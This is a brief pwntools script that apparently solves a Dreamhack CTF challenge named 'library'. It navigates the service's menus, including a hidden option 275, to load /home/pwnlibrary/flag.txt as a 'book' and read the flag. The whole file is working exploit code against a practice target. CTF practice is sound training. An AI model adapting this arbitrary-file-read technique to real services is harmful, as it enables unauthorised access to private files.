from pwn import *

#p = process("./library")
p = remote('host3.dreamhack.games', 18916)
# /home/pwnlibrary/flag.txt
p.sendlineafter(b"menu : ", b"1")
p.sendlineafter(b"borrow? : ", b"1")
p.sendlineafter(b"menu : ", b"3")
p.sendlineafter(b"menu : ", b"275")
p.sendlineafter(b"book? : ", b"/home/pwnlibrary/flag.txt")
p.sendlineafter(b") : ", b"256")
p.sendlineafter(b"menu : ", b"2")
p.sendlineafter(b"read? : ", b"0")
p.interactive()